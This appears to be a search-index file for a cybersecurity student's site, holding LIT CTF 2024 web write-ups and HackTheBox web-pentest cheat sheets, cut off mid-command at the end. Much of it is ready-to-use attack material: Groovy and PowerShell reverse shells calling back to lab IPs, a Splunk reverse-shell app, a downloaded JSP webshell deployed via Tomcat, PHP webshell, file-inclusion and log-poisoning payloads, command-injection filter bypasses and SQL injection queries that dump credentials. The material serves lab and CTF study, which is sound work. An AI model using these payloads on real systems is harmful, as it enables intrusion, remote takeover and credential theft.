{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"About","text":"<p>I am majoring in cybersecurity at BYU. I'm particularly interested in pentesting and enjoy solving CTF problems.</p>"},{"location":"#experience","title":"Experience","text":"<p>Please visit my LinkedIn Profile</p>"},{"location":"#contact","title":"Contact","text":"<p>LinkedIn or jinook.kim@icloud.com</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-1/","title":"web/jwt-1","text":""},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-1/#about","title":"About","text":"<p>\"I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at http://litctf.org:31781/ .\"</p> <p>Home Page: </p> <p>You can sign up to the website. </p> <p>However, when you click \"GET FLAG\", the webpage gives you \"Unauthorized\".</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-1/#recon","title":"Recon","text":"<p>As described in the introduction of the challenge, there is a JWT cookie after signing in. </p> <p>After doing some research, I came across the tool called JWT_Tool. If I put my cookie in, it gives me all the info. </p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-1/#exploitation","title":"Exploitation","text":"<p>It seems like I need to change that <code>admin</code> value to <code>True</code>. You can do that with the <code>-T</code> flag: <pre><code>python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGVzdDMzMyIsImFkbWluIjpmYWxzZX0.pexv7afakRnfXaUonh0o0Y96xPDz%2BSOsM453Mn%2F0YD -T\n</code></pre> </p> <p>Then, put the new cookie in the browser and hit \"GET FLAG\". </p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-2/","title":"web/jwt-2","text":""},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-2/#about","title":"About","text":"<p>\"its like jwt-1 but this one is harder URL: http://litctf.org:31777/ .\"</p> <p>The webpage looks exactly the same as <code>web/jwt-1</code>. This time, however, <code>index.ts</code> has been given: <pre><code>import express from \"express\";\nimport cookieParser from \"cookie-parser\";\nimport path from \"path\";\nimport fs from \"fs\";\nimport crypto from \"crypto\";\n\nconst accounts: [string, string][] = [];\n\nconst jwtSecret = \"xook\";\nconst jwtHeader = Buffer.from(\n  JSON.stringify({ alg: \"HS256\", typ: \"JWT\" }),\n  \"utf-8\"\n)\n  .toString(\"base64\")\n  .replace(/=/g, \"\");\n\nconst sign = (payload: object) =&gt; {\n  const jwtPayload = Buffer.from(JSON.stringify(payload), \"utf-8\")\n    .toString(\"base64\")\n    .replace(/=/g, \"\");\n    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');\n  return jwtHeader + \".\" + jwtPayload + \".\" + signature;\n\n}\n\nconst app = express();\n\nconst port = process.env.PORT || 3000;\n\napp.listen(port, () =&gt;\n  console.log(\"server up on http://localhost:\" + port.toString())\n);\n\napp.use(cookieParser());\napp.use(express.urlencoded({ extended: true }));\n\napp.use(express.static(path.join(__dirname, \"site\")));\n\napp.get(\"/flag\", (req, res) =&gt; {\n  if (!req.cookies.token) {\n    console.log('no auth')\n    return res.status(403).send(\"Unauthorized\");\n  }\n\n  try {\n    const token = req.cookies.token;\n    // split up token\n    const [header, payload, signature] = token.split(\".\");\n    if (!header || !payload || !signature) {\n      return res.status(403).send(\"Unauthorized\");\n    }\n    Buffer.from(header, \"base64\").toString();\n    // decode payload\n    const decodedPayload = Buffer.from(payload, \"base64\").toString();\n    // parse payload\n    const parsedPayload = JSON.parse(decodedPayload);\n        // verify signature\n        const expectedSignature = crypto.createHmac('sha256', jwtSecret).update(header + '.' + payload).digest('base64').replace(/=/g, '');\n        if (signature !== expectedSignature) {\n            return res.status(403).send('Unauthorized ;)');\n        }\n    // check if user is admin\n    if (parsedPayload.admin || !(\"name\" in parsedPayload)) {\n      return res.send(\n        fs.readFileSync(path.join(__dirname, \"flag.txt\"), \"utf-8\")\n      );\n    } else {\n      return res.status(403).send(\"Unauthorized\");\n    }\n  } catch {\n    return res.status(403).send(\"Unauthorized\");\n  }\n});\n\n.\n.\n.\n</code></pre></p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-2/#recon","title":"Recon","text":"<p>Looking at the code, I was able to figure out not only <code>admin</code> value needs to be <code>True</code>, but also <code>signature</code> part of the cookie needs to be constructed with <code>jwtSecret = \"xook\"</code> keyword.</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-2/#exploitation","title":"Exploitation","text":"<p>I wrote JavaScript code to craft the cookie. <pre><code>// cookie.js\nconst crypto = require('crypto');\n\nconst jwtHeader = Buffer.from(\n  JSON.stringify({ alg: \"HS256\", typ: \"JWT\" }),\n  \"utf-8\"\n)\n  .toString(\"base64\")\n  .replace(/=/g, \"\");\n\nconst jwtPayload = Buffer.from(JSON.stringify({ name: \"admin\", admin: true }), \"utf-8\")\n  .toString(\"base64\")\n  .replace(/=/g, \"\");\n\nconst jwtSecret = \"xook\";\nconst signature = crypto.createHmac('sha256', jwtSecret)\n  .update(jwtHeader + '.' + jwtPayload)\n  .digest('base64')\n  .replace(/=/g, '');\n\nconst token = `${jwtHeader}.${jwtPayload}.${signature}`;\n\nconsole.log(token);\n</code></pre></p> <pre><code>$ node cookie.js\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.MTnIgTB1oTbZ2pNsqQreiHQo9309/IoytyoVE4DshM8\n</code></pre> <p>Flag: LITCTF{v3rifyed_thI3_Tlme_1re4DV9}</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-kirbytime/","title":"web/kirbytime","text":""},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-kirbytime/#about","title":"About","text":"<p>\"Welcome to Kirby's Website.\" And there's a button that you can start the instance.</p> <p>The following files are given: </p> <p>main.py: <pre><code>import sqlite3\nfrom flask import Flask, request, redirect, render_template\nimport time\napp = Flask(__name__)\n\n\n@app.route('/', methods=['GET', 'POST'])\ndef login():\n    message = None\n    if request.method == 'POST':\n        password = request.form['password']\n        real = 'REDACTED'\n        if len(password) != 7:\n            return render_template('login.html', message=\"you need 7 chars\")\n        for i in range(len(password)):\n            if password[i] != real[i]:\n                message = \"incorrect\"\n                return render_template('login.html', message=message)\n            else:\n                time.sleep(1)\n        if password == real:\n            message = \"yayy! hi kirby\"\n\n    return render_template('login.html', message=message)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0')\n</code></pre></p> <p>login.html: <pre><code>.\n.\n.\n\n&lt;body&gt;\n    &lt;h1&gt;welcome back kirby :33&lt;/h1&gt;\n    &lt;p&gt;we will wait for u as u take ur time entering ur 7 character password&lt;/p&gt;\n\n    &lt;div class=\"container\"&gt;\n        &lt;img src=\"/static/kirby.png\" class=\"kirby-image\"&gt;\n        &lt;div class=\"form-container\"&gt;\n            &lt;form action=\"/\" method=\"POST\"&gt;\n                &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n                &lt;input type=\"password\" name=\"password\" id=\"password\"&gt;&lt;br&gt;\n                &lt;input type=\"submit\" value=\"Login\"&gt;\n            &lt;/form&gt;\n            {% if message %}\n                &lt;p&gt;{{ message }}&lt;/p&gt;\n            {% endif %}\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n</code></pre></p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-kirbytime/#recon","title":"Recon","text":"<p>It looks like we have to figure out that 7 digit password. Since the Python code checks the password one character by one and sleeps for 1 second if a character matches, we can exploit that behavior.</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-kirbytime/#exploitation","title":"Exploitation","text":"<p>Given the above information, I wrote a Python script: <pre><code>import requests\nimport time\n\nurl = 'http://34.31.154.223:50017'\npassword = [' '] * 7\ncharset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\npassword_found = ''\n\ndef measure_response_time(password_attempt):\n    start_time = time.time()\n    response = requests.post(url, data={'password': password_attempt})\n    end_time = time.time()\n    return end_time - start_time\n\nfor i in range(7):\n    for char in charset:\n        temp_password = password\n        temp_password[i] = char\n        passowrd_attempt = ''.join(temp_password)\n        response_time = measure_response_time(passowrd_attempt)\n        if response_time &gt; (i+1):\n            password[i] = char\n            password_found += char\n            print('Password found: ' + password_found)\n            break\n</code></pre> </p> <p>Due to the 10-minute time limit of the instance, I had to run the following script to figure out the last character of the password. <pre><code>import requests\nimport time\n\nurl = 'http://34.31.154.223:51478'\npassword = ['k','B','y','S','l','a','?']\ncharset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\npassword_found = ''\n\ndef measure_response_time(password_attempt):\n    start_time = time.time()\n    response = requests.post(url, data={'password': password_attempt})\n    end_time = time.time()\n    return end_time - start_time\n\nfor char in charset:\n    temp_password = password\n    temp_password[6] = char\n    passowrd_attempt = ''.join(temp_password)\n    print(\"Trying: \" + passowrd_attempt)\n    response_time = measure_response_time(passowrd_attempt)\n    if response_time &gt; (6+1):\n        password[6] = char\n        password_found += char\n        print('Password found: ' + password_found)\n        break\n</code></pre></p> <p>Flag: LITCTF{kBySlaY}</p>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/","title":"Attacking Common Application","text":""},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#application-discovery-enumeration","title":"Application Discovery &amp; Enumeration","text":"<pre><code>sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list\n</code></pre> <p>Using EyeWitness</p> <pre><code>source eyewitness-venv/bin/activate\npython Python/EyeWitness.py --web -x web_discovery.xml -d inlanefreight_eyewitness\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#wordpress","title":"WordPress","text":"<ul> <li>WPScan</li> <li>WordPress themes are located at <code>/wp-content/themes/&lt;theme name&gt;</code>.</li> </ul>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#joomla","title":"Joomla","text":"<p>droopescan</p> <pre><code>droopescan scan joomla --url http://dev.inlanefreight.local/\n</code></pre> <p>When you have access to Control Panel (<code>/administrator/index.php</code>):</p> <ol> <li>Click on Templates on the bottom left under Configuration to pull up the templates menu.</li> <li>Click on a template name. This will bring us to the <code>Templates: Customise</code> page.</li> <li>Click on a page to pull up the page source.</li> <li>Insert PHP code like: <code>system($_GET['cmd']);</code> 5.</li> </ol> <pre><code>curl -s http://example.com/templates/&lt;template name&gt;/file.php?cmd=id\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#drupal","title":"Drupal","text":"<p>droopescan</p> <pre><code>droopescan scan drupal -u http://drupal.inlanefreight.local\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#rce-using-php-filter-module","title":"RCE using PHP Filter module","text":"<p>Download module</p> <pre><code>wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz\n</code></pre> <p>Once downloaded go to <code>Administration</code> &gt; <code>Reports</code> &gt; <code>Available updates</code>.</p> <p>Once the module is installed, we can click on <code>Content</code> and create a new basic page.</p>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#tomcat","title":"Tomcat","text":""},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#login-brute-force","title":"Login Brute Force","text":"<p>Use the <code>auxiliary/scanner/http/tomcat_mgr_login</code> Metasploit module</p>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#tomcat-manager-war-file-upload","title":"Tomcat Manager - WAR File Upload","text":"<p>Browse to <code>/manager/html</code>.</p> <pre><code>wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp\nzip -r backup.war cmd.jsp\n</code></pre> <p>Upload the <code>backup.war</code> file and go to <code>/backup/cmd.jsp</code>.</p>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#jenkins","title":"Jenkins","text":"<p>The script console (<code>/script</code>) allows a user to run Apache Groovy scripts.</p>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#linux-host","title":"Linux Host","text":"<pre><code>def cmd = 'id'\ndef sout = new StringBuffer(), serr = new StringBuffer()\ndef proc = cmd.execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln sout\n</code></pre> <pre><code>r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\np.waitFor()\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#windows-host","title":"Windows Host","text":"<pre><code>def cmd = \"cmd.exe /c dir\".execute();\nprintln(\"${cmd.text}\")\n</code></pre> <pre><code>String host=\"10.10.10.10\";\nint port=4444;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Attacking%20Common%20Application/#splunk","title":"Splunk","text":"<p>Reverse shell via package upload</p> <p>Reference: https://github.com/0xjpuff/reverse_shell_splunk</p> <p>Directory structure</p> <pre><code>splunk_shell\n\u251c\u2500\u2500 bin\n\u2502   \u251c\u2500\u2500 rev.py\n\u2502   \u251c\u2500\u2500 run.bat\n\u2502   \u2514\u2500\u2500 run.ps1\n\u2514\u2500\u2500 default\n    \u2514\u2500\u2500 inputs.conf\n</code></pre> <p>run.ps1</p> <pre><code>$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n</code></pre> <p>run.bat</p> <pre><code>@ECHO OFF\nPowerShell.exe -exec bypass -w hidden -Command \"&amp; '%~dpn0.ps1'\"\nExit\n</code></pre> <p>inputs.conf</p> <pre><code>[script://./bin/rev.py]\ndisabled = 0\ninterval = 10\nsourcetype = shell\n\n[script://.\\bin\\run.bat]\ndisabled = 0\nsourcetype = shell\ninterval = 10\n</code></pre> <pre><code>tar -cvzf updater.tar.gz splunk_shell/\n</code></pre> <p>Start a listener. Then go to <code>/en-US/manager/search/apps/local</code> endpoint and choose <code>Install app from file</code>.</p>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/","title":"Command Injection","text":""},{"location":"HTB%20Web%20Pentest/Command%20Injection/#bypassing-space-filters","title":"Bypassing Space Filters","text":""},{"location":"HTB%20Web%20Pentest/Command%20Injection/#using-tabs-09","title":"Using Tabs (<code>%09</code>)","text":"<p><code>127.0.0.1%0a%09</code></p>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/#using-ifs","title":"Using $IFS","text":"<p>Linux Environment Variable ($IFS) default value is a space and a tab.</p> <p><code>127.0.0.1%0a${IFS}</code></p>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/#using-brace-expansion","title":"Using Brace Expansion","text":"<p><code>127.0.0.1%0a{ls,-la}</code></p>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/#bypassing-other-blacklisted-characters","title":"Bypassing Other Blacklisted Characters","text":""},{"location":"HTB%20Web%20Pentest/Command%20Injection/#linux","title":"Linux","text":"Character Bypass / <code>${PATH:0:1}</code> ; <code>${LS_COLORS:10:1}</code>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/#windows","title":"Windows","text":""},{"location":"HTB%20Web%20Pentest/Command%20Injection/#cmd","title":"CMD","text":"<pre><code>C:\\htb&gt; echo %HOMEPATH:~6,-11%\n\n\\\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/#powershell","title":"PowerShell","text":"<pre><code>PS C:\\htb&gt; $env:HOMEPATH[0]\n\n\\\n\n\nPS C:\\htb&gt; $env:PROGRAMFILES[10]\nPS C:\\htb&gt;\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/#character-shifting","title":"Character Shifting","text":"<pre><code>$ echo $(tr '!-}' '\"-~'&lt;&lt;&lt;[)\n\\\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/#bypassing-blacklisted-commands","title":"Bypassing Blacklisted Commands","text":"<pre><code>w'h'o'am'i\nw\"h\"o\"am\"i\nwho$@ami\nw\\ho\\am\\i\n$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")\n$(a=\"WhOaMi\";printf %s \"${a,,}\")\n$(rev&lt;&lt;&lt;'imaohw')\nbash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;d2hvYW1pCg==)  # using &lt;&lt;&lt; to avoid using a pipe |\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/#evasion-tools","title":"Evasion Tools","text":""},{"location":"HTB%20Web%20Pentest/Command%20Injection/#linux_1","title":"Linux","text":"<p>Bashfuscator</p>"},{"location":"HTB%20Web%20Pentest/Command%20Injection/#windows_1","title":"Windows","text":"<p>DOSfuscation</p>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/","title":"File Inclusion","text":""},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#php-wrappers","title":"PHP Wrappers","text":""},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#data","title":"Data","text":""},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#read-file","title":"Read file:","text":"<pre><code>php://filter/read=convert.base64-encode/resource=index.php\n</code></pre>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#rce","title":"RCE:","text":"<pre><code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' | base64\nPD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==\n</code></pre> <pre><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id\n</code></pre>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#input","title":"Input","text":"<pre><code>curl -s -X POST --data '&lt;?php system($_GET[\"cmd\"]); ?&gt;' \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id\"\n</code></pre>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#expect-not-common","title":"Expect (not common)","text":"<pre><code>expect://id\n</code></pre>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#remote-file-inclusion-rfi","title":"Remote File Inclusion (RFI)","text":"<p>On the attacker's server:</p> <pre><code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php\nsudo python3 -m http.server &lt;LISTENING_PORT&gt;\n</code></pre> <p>Payload: <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></p>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#using-ftp","title":"Using FTP","text":"<p>On the attacker's server:</p> <pre><code>sudo python -m pyftpdlib -p 21\n</code></pre> <p>Payload: <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id</code></p>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#using-smb","title":"Using SMB","text":"<pre><code>impacket-smbserver -smb2support share $(pwd)\n</code></pre> <p>Payload: <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\\\&lt;OUR_IP&gt;\\share\\shell.php&amp;cmd=whoami</code></p>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#lfi-and-file-uploads","title":"LFI and File Uploads","text":""},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#image","title":"Image","text":"<pre><code>echo 'GIF8&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.gif\n</code></pre> <p>Payload: <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></p>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#zip","title":"ZIP","text":"<pre><code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php\n</code></pre> <p>Payload: <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</code></p>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#phar","title":"Phar","text":"<p>shell.php</p> <pre><code>&lt;?php\n$phar = new Phar('shell.phar');\n$phar-&gt;startBuffering();\n$phar-&gt;addFromString('shell.txt', '&lt;?php system($_GET[\"cmd\"]); ?&gt;');\n$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');\n\n$phar-&gt;stopBuffering();\n</code></pre> <pre><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg\n</code></pre> <p>Payload: <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></p>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#log-poisoning","title":"Log Poisoning","text":""},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#php-session-poisoning","title":"PHP Session Poisoning","text":"<p>Location to session file in server: <code>/var/lib/php/sessions/sess_&lt;PHPSESSID cookie value&gt;</code></p> <p>Payload:</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E\nhttp://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id\n</code></pre>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#server-log-poisoning","title":"Server Log Poisoning","text":"<p>Send PHP code to log file:</p> <pre><code>echo -n \"User-Agent: &lt;?php system(\\$_GET['cmd']); ?&gt;\" &gt; Poison\ncurl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php\" -H @Poison\n</code></pre> <p>Execute command: <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></p>"},{"location":"HTB%20Web%20Pentest/File%20Inclusion/#wordlists","title":"Wordlists","text":"<p>LFI-Jhaddix.txt</p> <p>burp-parameter-names.txt</p> <p>Webroot path wordlist for Linux</p> <p>Webroot path wordlist for Windows</p> <p>Server configurations wordlist for Linux</p> <p>Server configurations wordlist for Windows</p>"},{"location":"HTB%20Web%20Pentest/File%20Upload%20Attacks/","title":"File Upload Attacks","text":"Category Command / File Description Client-Side Bypass <code>[CTRL+SHIFT+C]</code> Toggle Page Inspector Blacklist Bypass <code>shell.phtml</code> Uncommon extension <code>shell.pHp</code> Case manipulation PHP Extensions List of PHP extensions ASP Extensions List of ASP extensions Web Extensions List of web extensions Whitelist Bypass <code>shell.jpg.php</code> Double extension <code>shell.php.jpg</code> Reverse double extension <code>%20, %0a, %00, %0d0a, /, .\\, ., \u2026</code> Character injection (before/after extension) Content/Type Bypass Content-Types List of all content-types File Signatures List of file signatures / magic bytes Limited Uploads XSS HTML, JS, SVG, GIF XXE / SSRF XML, SVG, PDF, PPT, DOC DoS ZIP, JPG, PNG"},{"location":"HTB%20Web%20Pentest/File%20Upload%20Attacks/#gopherus","title":"Gopherus","text":"<p>Gopher payload generator</p> <p>https://github.com/tarunkant/Gopherus</p>"},{"location":"HTB%20Web%20Pentest/GraphQL%20Attacks/","title":"GraphQL Attacks","text":""},{"location":"HTB%20Web%20Pentest/GraphQL%20Attacks/#introspection","title":"Introspection","text":"<p>GraphQL-Voyager</p> <p>Burp Suite extention - InQL</p>"},{"location":"HTB%20Web%20Pentest/GraphQL%20Attacks/#dos-attacks","title":"DoS Attacks","text":"<p>Identify a loop between objects</p>"},{"location":"HTB%20Web%20Pentest/GraphQL%20Attacks/#batching-attacks","title":"Batching Attacks","text":"<p>Batching in GraphQL refers to executing multiple queries with a single request.</p> <pre><code>POST /graphql HTTP/1.1\nHost: 172.17.0.2\nContent-Length: 86\nContent-Type: application/json\n\n[\n    {\n        \"query\":\"{user(username: \\\"admin\\\") {uuid}}\"\n    },\n    {\n        \"query\":\"{post(id: 1) {title}}\"\n    }\n]\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Information%20Gathering/","title":"Information Gathering","text":""},{"location":"HTB%20Web%20Pentest/Information%20Gathering/#waf-identifier","title":"WAF identifier","text":""},{"location":"HTB%20Web%20Pentest/Information%20Gathering/#wafw00f","title":"wafw00f","text":"<p>https://github.com/EnableSecurity/wafw00f</p>"},{"location":"HTB%20Web%20Pentest/Information%20Gathering/#recon","title":"Recon","text":""},{"location":"HTB%20Web%20Pentest/Information%20Gathering/#finalrecon","title":"FinalRecon","text":"<p>https://github.com/thewhiteh4t/FinalRecon</p> <p>Features - Header Information - Whois - SSL Certificate Information - Crawler - DNS Enumeration - Subdomain Enumeration - Directory Enumeration - Wayback Machine - Port Scan - Export</p>"},{"location":"HTB%20Web%20Pentest/Information%20Gathering/#reconspider","title":"ReconSpider","text":"<p>https://github.com/bhavsec/reconspider</p> <ul> <li>Performs OSINT scan on a IP Address, Emails, Websites, Organizations and find out information from different sources.</li> <li>Correlates and collaborate the results, show them in a consolidated manner.</li> <li>Use specific script / launch automated OSINT for consolidated data.</li> </ul>"},{"location":"HTB%20Web%20Pentest/Login%20Brute%20Forcing/","title":"Login Brute Forcing","text":""},{"location":"HTB%20Web%20Pentest/Login%20Brute%20Forcing/#username-anarchy","title":"Username Anarchy","text":"<pre><code>git clone https://github.com/urbanadventurer/username-anarchy.git\ncd username-anarchy\n./username-anarchy Jane Smith &gt; jane_smith_usernames.txt\n</code></pre>"},{"location":"HTB%20Web%20Pentest/Login%20Brute%20Forcing/#cupp-common-user-passwords-profiler","title":"CUPP (Common User Passwords Profiler)","text":"<pre><code>sudo apt install cupp -y\n# Invoke CUPP in interactive mode\ncupp -i\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/","title":"SQL Injection","text":"<ul> <li>Union Injection</li> <li>Database Enumeration</li> <li>SQLMap</li> </ul>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#union-injection","title":"Union Injection","text":"<pre><code>' order by 2-- -\n' order by 3-- -\n</code></pre> <pre><code>' UNION select 1,2,3-- -\n' UNION select 1,2,3,4-- -\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#database-enumeration","title":"Database Enumeration","text":"<pre><code>' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#current-database","title":"Current database","text":"<pre><code>' UNION select 1,database(),2,3-- -\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#tables","title":"Tables","text":"<pre><code>' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -\n</code></pre> <p>When you only see one, use: <code>GROUP_CONCAT(table_name)</code></p>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#columns","title":"Columns","text":"<pre><code>' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -\n</code></pre> <p>When you only see one, use: <code>GROUP_CONCAT(column_name)</code></p>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#data","title":"Data","text":"<pre><code>' UNION select 1, username, password, 4 from dev.credentials-- -\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#sqlmap","title":"SQLMap","text":""},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#prefixsuffix","title":"Prefix/Suffix","text":"<pre><code>sqlmap -u \"www.example.com/?q=test\" --prefix=\"%'))\" --suffix=\"-- -\"\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#basic-db-data-enumeration","title":"Basic DB Data Enumeration","text":"<ul> <li>Database version banner (switch <code>--banner</code>)</li> <li>Current user name (switch <code>--current-user</code>)</li> <li>Current database name (switch <code>--current-db</code>)</li> <li>Checking if the current user has DBA (administrator) rights (switch <code>--is-dba</code>)</li> </ul>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#limit-output","title":"Limit Output","text":"<pre><code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --start=2 --stop=3\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#conditional-enumeration","title":"Conditional Enumeration","text":"<pre><code>sqlmap -u 